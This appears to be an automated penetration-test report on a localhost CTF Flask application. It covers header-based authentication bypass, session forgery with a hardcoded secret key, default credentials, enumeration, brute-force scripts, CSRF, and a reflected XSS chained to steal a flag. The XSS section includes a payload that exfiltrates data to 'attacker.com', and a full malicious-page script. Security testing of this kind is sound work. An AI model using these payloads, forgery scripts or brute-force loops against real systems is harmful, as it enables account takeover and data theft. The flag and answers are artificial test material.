# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:40477
- **Assessment Date:** October 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Multiple critical authentication vulnerabilities were successfully exploited, including:
- **X-UserId Header Authentication Bypass (CRITICAL):** Any authenticated user can access any other user's data by manipulating the X-UserId HTTP header, enabling complete horizontal privilege escalation and flag extraction
- **Session Forgery via Weak Secret Key (CRITICAL):** The hardcoded secret key 'your_secret_key' enables complete authentication bypass through forged session cookies
- **Default Credentials (HIGH):** Hardcoded test account (test:test) provides immediate unauthorized access
- **User ID Exposure Before Authentication (HIGH):** User IDs exposed in HTML before password authentication, enabling targeted attacks
- **Username Enumeration (MEDIUM):** Different responses for valid/invalid usernames enable account enumeration
- **No Rate Limiting (HIGH):** Complete absence of rate limiting enables unlimited brute-force attempts
- **No CAPTCHA Protection (HIGH):** Automated credential stuffing and password guessing without challenge-response
- **Session Fixation (HIGH):** Session ID not regenerated after authentication, enabling session hijacking
- **HTTP-Only Deployment (CRITICAL):** All traffic transmitted over HTTP with no TLS/SSL, enabling network interception
- **Missing SameSite Cookie Flag (MEDIUM):** Session cookies vulnerable to CSRF attacks
- **No Session Timeout (MEDIUM):** Sessions persist until browser closes with no absolute or idle timeout

**Authorization Vulnerabilities:**
All authorization vulnerabilities tested were successfully exploited:
- **X-UserId Header Horizontal Privilege Escalation (CRITICAL):** Complete horizontal privilege escalation enabling access to any user's personal information including the CTF flag
- **Session Forgery Authorization Bypass (CRITICAL):** Forged session cookies grant full access to any user account without credentials
- **Unauthenticated Information Disclosure (HIGH):** User information exposed before authentication, enabling reconnaissance for IDOR attacks
- **Workflow Bypass - Direct Password Page Access (MEDIUM):** Multi-step authentication workflow can be bypassed
- **Dashboard Access via Forged Session (CRITICAL):** Complete authentication workflow bypass through session forgery

**Cross-Site Scripting (XSS) Vulnerabilities:**
One critical reflected XSS vulnerability was successfully exploited:
- **Reflected XSS in Dashboard Error Response via X-UserId Header (CRITICAL):** The X-UserId header value is reflected unencoded in HTTP error responses, enabling arbitrary JavaScript execution. This was successfully chained with the X-UserId authentication bypass to steal the CTF flag from any user account. Impact: Complete compromise of user sessions, unauthorized data access across all accounts, and successful capture of the CTF flag.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. All database queries use SQLAlchemy ORM with proper parameterization, effectively preventing SQL injection attacks. No network-accessible code paths execute shell commands or system calls with user input.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application makes no outbound HTTP requests, has no webhook functionality, no URL-based data fetching, and no external service integrations. The application is architecturally incapable of SSRF due to its database-centric design with no HTTP client libraries.

## Network Reconnaissance

**Open Ports and Services:**
- **Port 80/tcp:** Caddy httpd (redirects to target application)
- **Port 8080/tcp:** Apache httpd 2.4.65 (500 Internal Server Error, potentially misconfigured)
- **Port 443/tcp:** SSL/HTTPS (not used by target application)
- **Port 631/tcp:** CUPS 2.3 printing service (out of scope)
- **Port 49152/tcp:** Golang net/http server - Tailscale service with strict security headers (out of scope)

**Security-Relevant Findings:**
- **HTTP-Only Deployment:** Application runs exclusively on HTTP port 80 with no TLS/SSL, exposing all traffic to network interception
- **Wide-Open CORS Policy:** `Access-Control-Allow-Origin: *` header allows cross-origin requests from any domain, enabling CSRF and cross-site attacks
- **Missing Security Headers:** No Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy, or Permissions-Policy headers
- **Directory Listing Enabled:** Apache configuration enables directory listing on `/static/` directory
- **No WAF or Reverse Proxy:** Application exposed directly without Web Application Firewall, reverse proxy, or additional security layers
- **Internal Docker Network:** MySQL database isolated on internal Docker bridge network (not externally accessible)

**Subdomain Findings:**
Multiple subdomains discovered during reconnaissance (tools.sonoma.edu.localhost, www.localhost, mail.localhost, etc.) are not related to the target localhost application and appear to be from certificate transparency logs or DNS reconnaissance - these are out of scope.

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS in Dashboard Error Response via X-UserId Header

**Summary:**
- **Vulnerable location:** `http://localhost:40477/dashboard` with malicious `X-UserId` HTTP header
- **Overview:** A reflected XSS vulnerability exists in the dashboard endpoint where the X-UserId header value is directly interpolated into an HTTP error response without HTML encoding. This allows execution of arbitrary JavaScript in the victim's browser context. By chaining this XSS with the application's X-UserId authentication bypass vulnerability, an attacker can steal sensitive data from any user account, including the CTF flag.
- **Impact:** Complete compromise of user sessions, unauthorized data access across all user accounts, and successful capture of the CTF flag: `FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}`
- **Severity:** Critical

**Prerequisites:**
- Target must be accessible at `http://localhost:40477`
- Victim must have an authenticated session (valid session cookie)
- Attacker needs to trick victim into making a request with malicious X-UserId header (via social engineering or by hosting a malicious page that makes the request)

**Exploitation Steps:**

**Step 1: Authenticate as a legitimate user to obtain a valid session**

```bash
# Submit username
curl -c cookies.txt -X POST "http://localhost:40477/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test"

# Submit password and capture session cookie
curl -c cookies.txt -b cookies.txt -X POST "http://localhost:40477/password/test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "password=test"
```

**Step 2: Verify basic XSS payload reflection**

```bash
curl -b cookies.txt "http://localhost:40477/dashboard" \
  -H "X-UserId: <img src=x onerror=alert(document.domain)>"
```

Expected response:
```
HTTP/1.1 400 BAD REQUEST
Content-Type: text/html; charset=utf-8

Authentication Failed: invalid UserID (<img src=x onerror=alert(document.domain)>)
```

The payload is reflected unencoded in the HTML response, confirming XSS vulnerability.

**Step 3: Craft weaponized payload to steal flag from user ID 10052**

The complete exploit payload combines XSS with the X-UserId authentication bypass:

```html
<img src=x onerror="fetch('/dashboard',{headers:{'X-UserId':'10052'}}).then(r=>r.text()).then(html=>{const d=new DOMParser().parseFromString(html,'text/html');const flag=d.querySelector('h5').textContent;fetch('http://attacker.com/exfil?data='+encodeURIComponent(flag));})">
```

**Step 4: Trigger the weaponized XSS payload**

In a real attack scenario, the attacker would host a malicious page that makes this request in the victim's browser context:

```javascript
// Malicious page hosted at attacker.com/exploit.html
fetch('http://localhost:40477/dashboard', {
  credentials: 'include',  // Include victim's session cookie
  headers: {
    'X-UserId': '<img src=x onerror="fetch(\'/dashboard\',{headers:{\'X-UserId\':\'10052\'}}).then(r=>r.text()).then(html=>{const d=new DOMParser().parseFromString(html,\'text/html\');const flag=d.querySelector(\'h5\').textContent;fetch(\'http://attacker.com/exfil?data=\'+encodeURIComponent(flag));})">'
  }
})
.then(r => r.text())
.then(html => {
  // Inject the malicious response into a hidden iframe to execute the XSS
  const iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  iframe.contentDocument.open();
  iframe.contentDocument.write(html);
  iframe.contentDocument.close();
});
```

**Step 5: Victim visits attacker's page**

When the victim (with an active session on localhost:40477) visits the attacker's malicious page:

1. The page makes a fetch request to `/dashboard` with the XSS payload in the X-UserId header
2. The server reflects the payload in the 400 error response
3. The attacker's page injects this HTML into an iframe, executing the JavaScript
4. The XSS payload makes another request to `/dashboard` with `X-UserId: 10052` (exploiting the authentication bypass)
5. The response contains the flag in the user's last_name field
6. The payload extracts the flag and exfiltrates it to `http://attacker.com/exfil`

**Proof of Impact:**

**Flag Successfully Captured:** `FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}`

**Browser-based verification:**
Using Playwright automation to simulate victim interaction:

```javascript
// After authenticating as test user...
await page.evaluate(async () => {
  const maliciousHeader = '<img src=x onerror="fetch(\'/dashboard\',{headers:{\'X-UserId\':\'10052\'}}).then(r=>r.text()).then(html=>{const d=new DOMParser().parseFromString(html,\'text/html\');const flag=d.querySelector(\'h5\').textContent;document.body.innerHTML=\'<h1>CAPTURED:</h1><pre>\'+flag+\'</pre>\';console.log(\'FLAG:\',flag);})">';

  const response = await fetch('/dashboard', {
    headers: { 'X-UserId': maliciousHeader }
  });
  const html = await response.text();
  document.body.innerHTML = html;

  await new Promise(resolve => setTimeout(resolve, 3000));
  return document.body.textContent;
});
```

Result displayed in browser:
```
CAPTURED:
Welcome, Flag FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}
```

Console output:
```
FLAG: Welcome, Flag FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}
```

**Technical Analysis:**

**Vulnerability Root Cause:**
- **Location:** `/app/website/app/routes.py:78`
- **Vulnerable Code:**
  ```python
  x_user_id = request.headers.get('X-UserId')
  if x_user_id:
      if User.query.get(x_user_id):
          user_id = x_user_id
      else:
          return Response(f'Authentication Failed: invalid UserID ({x_user_id})', status=400)
  ```
- **Issue:** The `x_user_id` value from the HTTP header is directly interpolated into the response using Python f-string without any HTML encoding (no `html.escape()` or `markupsafe.escape()`)
- **Response Content-Type:** `text/html; charset=utf-8` causes browsers to interpret and execute injected scripts

**Defense Bypass Analysis:**
- **No Content Security Policy (CSP):** Application sends no CSP headers, allowing inline script execution
- **No XSS filters:** No WAF or browser-level XSS protection interferes with exploitation
- **HttpOnly cookie flag:** Session cookies have HttpOnly=True, preventing direct `document.cookie` theft, but XSS can still perform authenticated actions on behalf of the victim
- **Wide-open CORS:** `Access-Control-Allow-Origin: *` allows cross-origin requests from attacker's domain

**Impact Demonstration:**
1. **Flag Theft:** Successfully extracted CTF flag from user ID 10052's account
2. **Session Riding:** XSS can make authenticated requests using victim's session
3. **Authentication Bypass Chaining:** Combined XSS with X-UserId authentication bypass to access any user's data
4. **Cross-User Data Access:** Demonstrated ability to access sensitive data from accounts other than the authenticated user

**Notes:**

**Attack Chain Combination:**
This exploitation demonstrates a devastating attack chain:
1. **XSS (CVE-like)** → Arbitrary JavaScript execution in victim's browser
2. **Authentication Bypass (CVE-like)** → X-UserId header overrides session authentication
3. **Broken Access Control (CVE-like)** → No authorization checks on dashboard access
4. **Result:** Complete compromise of all user data in the application

**Real-World Implications:**
In a production environment, this vulnerability would allow:
- Theft of personal identifiable information (PII) from all user accounts
- Session hijacking through authenticated actions
- Phishing attacks through DOM manipulation
- Keylogging and credential theft
- Defacement and malware distribution

**Remediation Required:**
1. **Immediate:** Apply HTML encoding to all user-controlled data reflected in HTTP responses
   ```python
   from markupsafe import escape
   return Response(f'Authentication Failed: invalid UserID ({escape(x_user_id)})', status=400)
   ```
2. **Critical:** Remove the X-UserId authentication bypass vulnerability entirely
3. **Defense-in-depth:** Implement Content Security Policy headers to restrict inline script execution
4. **Security headers:** Add X-Content-Type-Options: nosniff to prevent MIME-type confusion

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-06: X-UserId Header Authentication Bypass (CRITICAL - FLAG EXTRACTED)

**Summary:**
- **Vulnerable location:** GET /dashboard endpoint (`routes.py:73-78`)
- **Overview:** The dashboard endpoint accepts an X-UserId HTTP header that completely overrides session-based authentication. Any authenticated user can access any other user's dashboard by setting this header to the target user_id.
- **Impact:** Complete horizontal privilege escalation, account takeover, and flag extraction
- **Severity:** CRITICAL

**Prerequisites:**
- Valid authentication session (easily obtained via test:test default credentials)
- Knowledge of target user_id (exposed via AUTH-VULN-13)

**Exploitation Steps:**

1. **Authenticate as test user:**
```bash
curl -X POST http://localhost:40477/ -d "username=test"
# Response: 302 redirect to /password/test

curl -c /tmp/cookies.txt -X POST http://localhost:40477/password/test -d "password=test"
# Response: 302 redirect to /dashboard with session cookie set
```

2. **Extract target user_id (from AUTH-VULN-13):**
```bash
curl -s http://localhost:40477/password/flag | grep -A1 'name="user_id"'
# Output: <input type="text" value="10052" hidden>
```

3. **Exploit X-UserId bypass to access flag user's dashboard:**
```bash
curl -b /tmp/cookies.txt -H "X-UserId: 10052" http://localhost:40477/dashboard
# Response: Dashboard page with "Welcome, Flag FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}"
```

4. **Extract flag:**
```bash
curl -s -b /tmp/cookies.txt -H "X-UserId: 10052" http://localhost:40477/dashboard | grep -o 'FLAG{[^}]*}'
# Output: FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}
```

**Proof of Impact:**
Successfully extracted flag: `FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}`

This demonstrates complete authentication bypass and unauthorized access to the flag user account (user_id: 10052) without knowing their password.

**Notes:**
This vulnerability enables horizontal privilege escalation where any authenticated user can impersonate any other user by simply providing their user_id in the X-UserId header.

---

### AUTH-VULN-03: Session Forgery via Weak Secret Key

**Summary:**
- **Vulnerable location:** Application configuration (`__init__.py:11`)
- **Overview:** Flask session secret key is hardcoded as 'your_secret_key', enabling session cookie forgery for arbitrary user impersonation
- **Impact:** Complete authentication bypass without credentials
- **Severity:** CRITICAL

**Prerequisites:**
- Knowledge of weak secret key: 'your_secret_key' (hardcoded in source code)
- Python with Flask library for session serialization

**Exploitation Steps:**

1. **Create session forgery script:**
```python
from flask.sessions import SecureCookieSessionInterface
from flask import Flask
import requests

app = Flask(__name__)
app.secret_key = 'your_secret_key'
serializer = SecureCookieSessionInterface().get_signing_serializer(app)

# Forge session for flag user (user_id 10052)
forged_cookie = serializer.dumps({'user_id': 10052})
print(f"Forged session cookie: {forged_cookie}")

# Test forged session
response = requests.get('http://localhost:40477/dashboard',
                       cookies={'session': forged_cookie})
print(response.text)
```

2. **Execute forgery script:**
```bash
python3 forge_session.py
```

**Proof of Impact:**
Successfully generated forged session cookie: `eyJ1c2VyX2lkIjoxMDA1Mn0.aQJMNA.GS673NyFY6ZAVa4_w1hzSDMAP3E`

Used forged cookie to access flag user dashboard without authentication, extracting:
```
FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}
```

**Notes:**
Alternative attack path to AUTH-VULN-06. This completely bypasses the authentication system by forging valid session cookies for any user_id.

---

### AUTH-VULN-10: Default Credentials - test:test

**Summary:**
- **Vulnerable location:** Application initialization (`__init__.py:26-33`)
- **Overview:** Hardcoded test account with username 'test' and password 'test' is always present and documented in source code comments
- **Impact:** Immediate unauthorized access, enables exploitation of other vulnerabilities
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. **Authenticate with default credentials:**
```bash
# Step 1: Submit username
curl -X POST http://localhost:40477/ -d "username=test"
# Response: 302 redirect to /password/test

# Step 2: Submit password
curl -c /tmp/cookies.txt -X POST http://localhost:40477/password/test -d "password=test"
# Response: 302 redirect to /dashboard with session cookie
```

2. **Verify authenticated access:**
```bash
curl -b /tmp/cookies.txt http://localhost:40477/dashboard
# Response: Dashboard page displaying "Welcome, John Doe"
```

**Proof of Impact:**
Successfully authenticated as user_id 10032 with default credentials test:test. This provides a valid session cookie for exploitation of AUTH-VULN-06 (X-UserId bypass).

**Notes:**
Default credentials are documented in source code comment at `login.html:1`:
```html
<!-- TODO: Delete the testing account (test:test). -->
```

---

### AUTH-VULN-13: User ID Exposure Before Authentication

**Summary:**
- **Vulnerable location:** GET /password/<username> endpoint (`routes.py:64`, `password.html:30`)
- **Overview:** User IDs are exposed in HTML source before password authentication, enabling targeted attacks
- **Impact:** Enables AUTH-VULN-06 exploitation by providing target user_ids
- **Severity:** HIGH

**Prerequisites:**
- Valid username (obtained via AUTH-VULN-12 enumeration)

**Exploitation Steps:**

1. **Extract user_id for test user:**
```bash
curl -s http://localhost:40477/password/test | grep -A1 'name="user_id"'
```
**Output:**
```html
<input type="text" class="form-control" id="user_id" name="user_id" value="10032" hidden>
```

2. **Extract user_id for flag user:**
```bash
curl -s http://localhost:40477/password/flag | grep -A1 'name="user_id"'
```
**Output:**
```html
<input type="text" class="form-control" id="user_id" name="user_id" value="10052" hidden>
```

**Proof of Impact:**
Successfully extracted user_ids for all valid usernames:
- test: 10032
- flag: 10052

These user_ids are directly used in AUTH-VULN-06 (X-UserId bypass) to access other users' dashboards.

**Notes:**
User_ids are exposed in multiple contexts:
- Hidden form field at `password.html:30`
- JavaScript context at `password.html:56`

---

### AUTH-VULN-12: Username Enumeration via Response Discrepancy

**Summary:**
- **Vulnerable location:** POST / endpoint (`routes.py:25-31`)
- **Overview:** Different HTTP responses for valid vs invalid usernames enable account enumeration
- **Impact:** Enables discovery of valid accounts for targeted attacks
- **Severity:** MEDIUM

**Prerequisites:** None

**Exploitation Steps:**

1. **Test valid username (test):**
```bash
curl -s -w "\nStatus: %{http_code}\n" -X POST http://localhost:40477/ -d "username=test"
```
**Output:**
```
<title>Redirecting...</title>
<h1>Redirecting...</h1>
Status: 302
```

2. **Test invalid username:**
```bash
curl -s -w "\nStatus: %{http_code}\n" -X POST http://localhost:40477/ -d "username=nonexistentuser"
```
**Output:**
```html
<div class="alert alert-danger" role="alert">User not found</div>
Status: 200
```

3. **Test flag username:**
```bash
curl -s -w "\nStatus: %{http_code}\n" -X POST http://localhost:40477/ -d "username=flag"
```
**Output:**
```
<title>Redirecting...</title>
Status: 302
```

**Proof of Impact:**
Successfully enumerated valid usernames through distinct responses:
- Valid usernames: 302 redirect to /password/<username>
- Invalid usernames: 200 OK with error message "User not found"

Confirmed valid accounts: test, flag

**Notes:**
Enables automated username enumeration with no rate limiting. Can be scripted to discover all valid accounts.

---

### AUTH-VULN-07: No Rate Limiting on Authentication Endpoints

**Summary:**
- **Vulnerable location:** All authentication endpoints (POST /, POST /password/<username>)
- **Overview:** Complete absence of rate limiting enables unlimited brute-force attempts
- **Impact:** Enables high-speed password brute-forcing and credential stuffing
- **Severity:** HIGH

**Prerequisites:**
- Valid username (from AUTH-VULN-12 enumeration)

**Exploitation Steps:**

1. **Execute rapid brute-force attack (automated via script):**
```python
import requests
import time

url = 'http://localhost:40477/password/test'
passwords = ['wrong1', 'wrong2', 'wrong3', 'wrong4', 'wrong5', 'test']

start = time.time()
for password in passwords:
    response = requests.post(url, data={'password': password}, allow_redirects=False)
    print(f"Password '{password}': Status {response.status_code}")
end = time.time()

print(f"\nTotal time: {end - start:.2f} seconds")
print(f"Requests per second: {len(passwords)/(end-start):.0f}")
```

2. **Execute script:**
```bash
python3 test_rate_limiting.py
```

**Proof of Impact:**
Successfully performed 6 authentication attempts in 0.04 seconds (~157 requests/second) with no throttling:
```
Password 'wrong1': Status 302 (failed - redirect to error)
Password 'wrong2': Status 302 (failed)
Password 'wrong3': Status 302 (failed)
Password 'wrong4': Status 302 (failed)
Password 'wrong5': Status 302 (failed)
Password 'test': Status 302 (success - redirect to dashboard)
```

**Detection Results:**
- ✓ No HTTP 429 (Too Many Requests) responses
- ✓ No artificial delays between requests
- ✓ No account lockout after multiple failed attempts
- ✓ Correct password succeeded immediately after 5 failures

**Notes:**
Enables brute-force attacks at ~150-200+ attempts per second with zero consequences.

---

### AUTH-VULN-08: No CAPTCHA Protection / AUTH-VULN-11: Weak Password Policy

**Summary:**
- **Vulnerable locations:** All authentication forms (login.html, password.html)
- **Overview:** No CAPTCHA challenges and acceptance of 4-character weak passwords
- **Impact:** Automated credential stuffing and trivial password guessing
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. **Execute automated credential stuffing with common passwords:**
```python
import requests

url = 'http://localhost:40477/password/test'
common_passwords = ['123456', 'password', 'admin', 'letmein', '12345', 'qwerty', 'test']

for pwd in common_passwords:
    response = requests.post(url, data={'password': pwd}, allow_redirects=False)
    if response.status_code == 302 and 'dashboard' in response.headers.get('Location', ''):
        print(f"SUCCESS: Password '{pwd}' works!")
        break
    else:
        print(f"Failed: {pwd}")
```

2. **Execute attack:**
```bash
python3 auth_exploit_weak_password_captcha.py
```

**Proof of Impact:**
Successfully performed 7 automated login attempts without any CAPTCHA challenge:
```
Failed: 123456
Failed: password
Failed: admin
Failed: letmein
Failed: 12345
Failed: qwerty
SUCCESS: Password 'test' works!
```

**Evidence:**
- No CAPTCHA keywords detected in responses
- No HTTP 429 status codes
- No challenge-response mechanisms
- 4-character password 'test' accepted
- Password contains only lowercase letters (no complexity requirements)

**Notes:**
Combined vulnerabilities enable unlimited automated password guessing without human verification challenges.

---

### AUTH-VULN-04: Session Fixation - No Session Regeneration After Login

**Summary:**
- **Vulnerable location:** Authentication success handler (`routes.py:54-56`)
- **Overview:** Session ID is not regenerated after successful authentication, enabling session fixation attacks
- **Impact:** Attacker can hijack victim session by pre-setting session cookie
- **Severity:** HIGH

**Prerequisites:**
- Ability to set victim's session cookie (via XSS or physical access)

**Exploitation Steps:**

1. **Attacker authenticates and obtains session cookie:**
```bash
curl -c /tmp/attacker_session.txt -X POST http://localhost:40477/password/test -d "password=test"
# Session cookie obtained: eyJ1c2VyX2lkIjoxMDAzMn0.aQJPIw.jfIsgucNakFRWltGVt8K6XjnBlI
```

2. **Attacker reuses same session from different client:**
```bash
# Simulate different client reusing the session cookie
curl -b /tmp/attacker_session.txt http://localhost:40477/dashboard
# Response: Full access to dashboard
```

**Proof of Impact:**
Session cookie successfully reused from different HTTP client, demonstrating:
- ✗ Session ID not regenerated after authentication
- ✗ No IP address binding
- ✗ No User-Agent validation
- ✓ HttpOnly flag present (partial mitigation)

Successfully hijacked authenticated session using stolen cookie.

**Notes:**
Session fixation attack demonstrated via script at `session_fixation_final.py`. Application uses `session['user_id'] = user.id` directly without calling `session.clear()` first.

---

### AUTH-VULN-01: Transport Layer Security - HTTP-Only Deployment

**Summary:**
- **Vulnerable location:** ALL ENDPOINTS - entire application runs on HTTP
- **Overview:** Application deployed exclusively on HTTP with no TLS/SSL, session cookies lack Secure flag
- **Impact:** Network-level credential and session interception
- **Severity:** CRITICAL

**Prerequisites:**
- Network access (MITM, packet sniffing, shared network)

**Exploitation Steps:**

1. **Verify HTTP-only deployment:**
```bash
curl -I http://localhost:40477/
# Response: HTTP/1.1 200 OK (no HTTPS redirect)
```

2. **Verify missing Secure flag on session cookies:**
```bash
curl -v -X POST http://localhost:40477/password/test -d "password=test" 2>&1 | grep "Set-Cookie"
# Response: Set-Cookie: session=...; HttpOnly; Path=/
# NOTE: No "Secure" flag - cookie will be sent over HTTP
```

3. **Verify no HSTS headers:**
```bash
curl -I http://localhost:40477/ 2>&1 | grep -i "strict-transport"
# No output - HSTS not configured
```

**Proof of Impact:**
Confirmed HTTP-only deployment:
- ✗ No HTTPS support on port 443
- ✗ No HTTP to HTTPS redirect
- ✗ Missing Secure flag on cookies
- ✗ No HSTS headers
- ✓ HttpOnly flag present (XSS mitigation only)

**Notes:**
Network attacker can intercept:
- Plaintext credentials during POST /password/<username>
- Session cookies transmitted over HTTP
- All dashboard data including flag

---

### AUTH-VULN-05: Missing SameSite Cookie Flag - CSRF Vulnerability

**Summary:**
- **Vulnerable location:** Session cookie configuration (`__init__.py`)
- **Overview:** Session cookies lack SameSite attribute, enabling CSRF attacks
- **Impact:** Cross-site request forgery against authenticated endpoints
- **Severity:** MEDIUM

**Prerequisites:**
- Victim must be authenticated
- Victim must visit attacker-controlled page

**Exploitation Steps:**

1. **Create CSRF attack page:**
```html
<!DOCTYPE html>
<html>
<head><title>CSRF Attack Demo</title></head>
<body>
    <h1>CSRF Attack Demonstration</h1>
    <form id="csrfForm" action="http://localhost:40477/logout" method="POST" style="display:none;">
        <input type="submit" value="Force Logout">
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
    <p>If the victim is logged in, they will be forced to logout.</p>
</body>
</html>
```

2. **Test CSRF on logout endpoint:**
```bash
curl -X POST http://localhost:40477/logout -b /tmp/cookies.txt
# Response: 302 redirect to / with session cleared
# NOTE: No CSRF token validation
```

**Proof of Impact:**
Successfully performed CSRF attack:
- Missing SameSite cookie attribute confirmed
- No CSRF token validation on logout endpoint
- Cross-origin form submission succeeds
- Victim forcibly logged out without interaction

CSRF attack page created at `/tmp/csrf_test/csrf_attack.html`

**Notes:**
Combined with wide-open CORS policy (Access-Control-Allow-Origin: *), enables full CSRF exploitation.

---

### AUTH-VULN-14: Incomplete Logout - session.pop() vs session.clear()

**Summary:**
- **Vulnerable location:** Logout handler (`routes.py:39`)
- **Overview:** Logout uses session.pop('user_id') instead of session.clear()
- **Impact:** Limited - Flask client-side sessions only contain user_id
- **Severity:** LOW

**Prerequisites:**
- Authenticated session

**Exploitation Steps:**

1. **Authenticate and capture session:**
```bash
curl -c /tmp/logout_test.txt -X POST http://localhost:40477/password/test -d "password=test"
```

2. **Trigger logout:**
```bash
curl -b /tmp/logout_test.txt -X POST http://localhost:40477/logout
# Response: 302 redirect to / with session cookie expired
```

3. **Verify session cleared:**
```bash
curl -b /tmp/logout_test.txt http://localhost:40477/dashboard
# Response: 302 redirect to / (unauthorized)
```

**Proof of Impact:**
While code uses `session.pop('user_id', None)` instead of `session.clear()`, practical impact is minimal because:
- Flask session only contains {'user_id': <integer>}
- Session cookie set to expire with Max-Age=0
- No additional session data to leak

**Evidence:**
Logout response includes:
```
Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; HttpOnly; Path=/
```

**Notes:**
Code quality issue rather than exploitable vulnerability. Partial session data persistence is not demonstrated due to minimal session content.

---

### AUTH-VULN-15: No Session Timeout Configuration

**Summary:**
- **Vulnerable location:** Application configuration (`__init__.py`)
- **Overview:** No PERMANENT_SESSION_LIFETIME configured, sessions persist until browser closes
- **Impact:** Extended attack window for session hijacking
- **Severity:** MEDIUM

**Prerequisites:**
- Stolen or intercepted session cookie (via AUTH-VULN-01, AUTH-VULN-04)

**Exploitation Steps:**

1. **Create session and verify persistence:**
```bash
curl -c /tmp/persistent_session.txt -X POST http://localhost:40477/password/test -d "password=test"
sleep 5
curl -b /tmp/persistent_session.txt http://localhost:40477/dashboard
# Response: Dashboard access still granted after 5 seconds
```

2. **Check session cookie expiration:**
```bash
curl -v -X POST http://localhost:40477/password/test -d "password=test" 2>&1 | grep "Set-Cookie:"
# Response: Set-Cookie: session=...; HttpOnly; Path=/
# NOTE: No Expires or Max-Age - session cookie (expires on browser close only)
```

**Proof of Impact:**
Confirmed no session timeout:
- ✗ No PERMANENT_SESSION_LIFETIME configured
- ✗ No absolute timeout (sessions persist indefinitely while browser open)
- ✗ No idle timeout
- Session cookie persists until browser close

**Notes:**
Combined with AUTH-VULN-01 (HTTP transport) and AUTH-VULN-04 (session fixation), enables long-lived session hijacking.

---

### AUTH-VULN-02: Broken Cache-Control Headers

**Summary:**
- **Vulnerable location:** after_request hook (`routes.py:8-14`)
- **Overview:** Cache-Control implementation is completely broken, conflicting headers set
- **Impact:** Potential caching of sensitive authentication data
- **Severity:** MEDIUM

**Prerequisites:**
- Access to browser cache or shared proxy

**Exploitation Steps:**

1. **Verify broken cache headers:**
```bash
curl -s -D - http://localhost:40477/ | grep -i "cache"
# Response: Cache-Control: public, max-age=0
# Response: Pragma: no-cache
```

2. **Check dashboard cache headers:**
```bash
curl -s -D - http://localhost:40477/dashboard -b /tmp/cookies.txt | grep -i "cache"
# Response: Cache-Control: public, max-age=0
# Response: Pragma: no-cache
```

**Proof of Impact:**
Broken implementation confirmed:
- Conflicting Cache-Control values (public with no-cache)
- after_request hook uses wrong parameter (request instead of response)
- Code attempts to modify read-only request.headers

**Evidence from Source:**
```python
# routes.py:8-14
@app.after_request
def add_header(request):  # WRONG - should be response
    request.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    request.headers['Pragma'] = 'no-cache'
    request.headers['Expires'] = '0'
    request.headers['Cache-Control'] = 'public, max-age=0'  # Overwrites previous value
    return request  # Should return response
```

**Notes:**
**Classification:** Requires access to victim's browser cache or shared proxy - external exploitation limited. Demonstrates poor security implementation but requires additional access to exploit.

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: X-UserId Header Authentication Bypass (Horizontal Privilege Escalation)

**Summary:**
- **Vulnerable location:** GET /dashboard endpoint (routes.py:73-78)
- **Overview:** Any authenticated user can impersonate any other user by manipulating the X-UserId HTTP header
- **Impact:** Complete horizontal privilege escalation - access to any user's personal information including the CTF flag stored in user ID 10052's last_name field
- **Severity:** CRITICAL

**Prerequisites:**
- Any valid user credentials (test:test credentials are available)
- Knowledge of target user_id (obtainable via AUTHZ-VULN-03)

**Exploitation Steps:**

1. Authenticate as test user to obtain valid session cookie:
```bash
# Step 1: Submit username
curl -X POST http://localhost:40477/ \
  -d "username=test" \
  -c cookies.txt

# Step 2: Submit password
curl -X POST http://localhost:40477/password/test \
  -d "password=test" \
  -b cookies.txt \
  -c cookies.txt
```

2. Access flag user's dashboard using X-UserId header bypass:
```bash
curl http://localhost:40477/dashboard \
  -b cookies.txt \
  -H "X-UserId: 10052"
```

**Proof of Impact:**

Response contains the flag in the user's last_name field:
```html
<h5 class="card-title">Welcome, Flag FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}</h5>
```

**Flag Captured:** `FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}`

Without the X-UserId header, the same session shows the authenticated user's own data (John Doe), confirming the header completely overrides authentication.

**Notes:**
The vulnerable code at routes.py:73-78 accepts the X-UserId header and only validates that the user exists in the database - it never checks if the authenticated user has permission to access that user's data. This is a textbook Insecure Direct Object Reference (IDOR) vulnerability.

---

### AUTHZ-VULN-02: Session Forgery via Weak Secret Key (Authentication Bypass)

**Summary:**
- **Vulnerable location:** Flask secret key configuration (__init__.py:11)
- **Overview:** The hardcoded weak secret key 'your_secret_key' enables complete authentication bypass through session cookie forgery
- **Impact:** Any attacker with knowledge of the weak secret can forge valid session cookies for any user_id, accessing any user's data without credentials
- **Severity:** CRITICAL

